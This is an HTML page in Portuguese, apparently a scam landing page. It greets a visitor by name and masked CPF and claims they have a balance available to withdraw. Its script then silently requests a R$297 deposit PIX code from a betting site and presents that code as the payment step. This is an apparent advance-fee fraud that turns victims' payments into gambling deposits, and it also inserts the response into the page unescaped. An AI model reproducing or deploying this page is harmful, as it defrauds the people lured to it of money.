<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagar</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: #f8f8f8;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }

        .info {
            margin-bottom: 20px;
        }

        .info p {
            font-size: 18px;
            margin: 10px 0;
        }

        .pix-placeholder {
            margin-top: 20px;
            padding: 20px;
            background-color: #f1f1f1;
            border-radius: 10px;
            font-size: 16px;
            color: #555;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 id="user-name"></h1>
        <div class="info">
            <p>Valor disponível para retirada: <span id="valor-disponivel"></span></p>
            <p>CPF do titular: <span id="cpf-titular"></span></p>
        </div>
        <div class="pix-placeholder" id="pix-placeholder">
            Aguarde, carregando código PIX...
        </div>
    </div>

    <script>
        function getParameterByName(name) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(name);
        }

        function formatarCPF(cpf) {
            if (!cpf || cpf.length !== 11) return cpf;
            return `${cpf.slice(0, 3)}.***.***-${cpf.slice(-2)}`;
        }

        const nome = getParameterByName('nome');
        const cpf = getParameterByName('cpf');
        const saldo = getParameterByName('saldo');

        if (nome && cpf && saldo) {
            document.getElementById('user-name').textContent = `Olá, ${nome}`;
            document.getElementById('valor-disponivel').textContent = `R$${parseFloat(saldo).toFixed(2).replace('.', ',')}`;
            document.getElementById('cpf-titular').textContent = formatarCPF(cpf);
        } else {
            alert("Dados inválidos. Por favor, retorne à página anterior.");
            window.location.href = "https://sites.google.com/view/rendaganha/home";
        }

        async function carregarCodigoPIX() {
            const url = "https://6n6bet.com/finance/third/deposit?t=1739533972414";
            const data = "amount=297&third_id=2060&join_promo=2&choose_promo=";

            try {
                const response = await fetch(url, {
                    method: "POST",
                    headers: {
                        "accept": "*/*",
                        "content-type": "application/x-www-form-urlencoded",
                        "origin": "https://6n6bet.com",
                        "user-agent": "Mozilla/5.0"
                    },
                    body: data
                });

                if (response.ok) {
                    const result = await response.json();
                    const codigoPix = result?.pix_code || "Código PIX não encontrado.";
                    document.getElementById("pix-placeholder").innerHTML = `
                        <p>Código PIX: ${codigoPix}</p>
                    `;
                } else {
                    document.getElementById("pix-placeholder").textContent = "Erro na requisição: " + response.status;
                }
            } catch (error) {
                document.getElementById("pix-placeholder").textContent = "Erro: " + error.message;
            }
        }

        carregarCodigoPIX();
    </script>
</body>
</html>
